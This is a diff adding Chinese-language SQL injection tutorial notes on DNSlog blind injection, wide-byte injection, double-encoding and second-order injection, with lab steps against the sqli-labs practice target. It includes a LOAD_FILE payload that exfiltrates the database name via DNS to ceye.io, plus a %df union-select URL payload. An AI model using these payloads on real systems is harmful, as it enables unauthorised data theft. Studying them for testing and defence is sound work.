@@ -286,6 +286,103 @@ if( ascii( substr(database(),1,1) )>115,0,sleep(5) )
 
  ## <font color = #1E90FF>Dnslog盲注</font>
  ### <font color = #FF0000>原理</font><BR>
+ __代码存在SQL注入漏洞<BR>然而页面即不会回显数据，也不会回显错误信息<BR>我们通过布尔或者时间盲注都可以获取到内容，但整个过程效率低，需要发送很多的请求进行判断，很可能会触发安全设备的防护<BR>我们需要一种方式，减少请求，直接回显数据，这里可以使用Dnslog实现注入__
 <figure class="thumbnails">
 	<img src="picture/SQLzhuru/dnslog注入1.png">
 </figure>
+
+ - **Dnslog平台:**
+	- **DNS在解析的时候会留下日志，通过读取多级域名的解析日志，获取请求信息**
+	```
+	http://ceye.io  # Dnslog平台
+	```
+	<figure class="thumbnails">
+	<img src="picture\SQLzhuru\dnslog盲注2.png">
+	</figure>
+
+- **mysql LOAD_FILE函数可以发起请求**
+
+### <font color = #FF0000>Dnslof盲注方法</font><BR>
+**构造语句，利用load_file()函数发起请求，使用Dnslog接受请求，获取数据**
+
+```
+核心语法:
+select LOAD_FILE(CONCAT('\\\\',(select database()),'.mysql.xxxx.ceye.io\\abc'));
+```
+<figure class="thumbnails">
+<img src="picture\SQLzhuru\Dnslog盲注3.png">
+</figure>
+
+### <font color = #FF0000>Dnslog盲注实验:</font><BR>
+* __1.打开Navicat，找任意数据库，执行上面语句__
+```
+select LOAD_FILE(CONCAT('\\\\',(select database()),'.mysql.xxxx.ceye.io\\abc'));
+```
+* __2.打开ceye.io下面的DNS Query栏中可以看到当前数据库名已经显示出来了__
+
+<figure class="thumbnails">
+<img src="picture\SQLzhuru\Dnslog盲注4.png">
+<img src="picture\SQLzhuru\Dnslog盲注5.png">
+</figure>
+
+## <font color = #1E90FF>宽字节注入</font>
+### <font color = #FF0000>宽字节注入原理</font><BR>
+- **什么叫做宽字节？**
+	- **简单来说，其大小为一个字节的就叫窄字节，为2个字节的就叫宽字节，英文默认1个字节，中文默认2个字节**
+	<figure class="thumbnails">
+	<img src="picture\SQLzhuru\宽字节注入1.png">
+	<img src="picture\SQLzhuru\宽字节注入2.png">
+	</figure>
+	
+### <font color = #FF0000>宽字节注入方法</font><BR>
+- **方法:**
+	- **在注入点后键入%df ,然后按照正常的注入流程开始注入**
+	```
+	http://192.168.2.149:86/Less-32/?id=%df'  union select 1,2,3 --+
+	```
+- **黑盒测试**
+	- **在可能的注入点后键入%df ,之后进行注入测试**
+- **白盒测试**
+	- **1.查看MYSQL编码是否为gbk**
+	- **2.是否使用preg_replace吧单引号替换成\\'**
+	- **3.是否使用addslashes进行转义**
+	- **4.是否使用mysql——real_escape_string进行转义**
+
+### <font color = #FF0000>宽字节注入实验:</font><BR>
+**环境：sqli靶场第32关**
+- **1.在url后方添加?id=1,界面正常**
+	- **在后方添加 and 1='1页面正常**
+	- **在后方添加 hid=%df1 and 1='1页面异常，判断'号被转义**
+	
+		```
+		1. http://192.168.2.149:86/Less-8/?id=1
+		2. http://192.168.2.149:86/Less-32/?id=%df1 and 1='1
+		```
+	<figure class="thumbnails">
+	<img src="picture\SQLzhuru\宽字节注入3.png">
+	</figure>
+- **2.下面按照正常的注入流程来就可以了**
+
+## <font color = #1E90FF>二次编码注入</font>
+### <font color = #FF0000>原理</font><BR>
+- **宽字节和二次编码注入:<BR>是在面对PHP代码或配置，对输入的`'`(单引号)进行转义的时候，在处理用户输入数据时存在问题，可以绕过转义**
+ 	<figure class="thumbnails">
+	<img src="picture\SQLzhuru\二次编码注入1.png">
+	</figure>	
+
+- **%2527讲解:**
+	- **1. 先将%25转义为%号,变成了%27**
+	- **2. %27又变转义成了'号，就形成了注入点**
+
+## <font color = #1E90FF>二次注入</font>
+### <font color = #FF0000>原理</font><BR>
+- **二次注入原理主要分两步:**
+	- **1.插入恶意数据**
+		- **第一次进行数据库插入数据点时候，仅仅对其中的特殊字符进行了转义，在写入数据库的时候还保留了原来的数据，但是数据本身包含恶意内容**
+	- **2.引用恶意数据**
+		- **在将数据引入到了数据库中之后，开发者就认为数据是可信的，在下一次需要进行查询的时候，直接从数据库中取出了恶意数据，没有进行进一步的检验和处理，这样就形成了SQL的二次注入**
+	<figure class="thumbnails">
+	<img src="picture\SQLzhuru\二次注入1.png">
+	</figure>	
+
+	
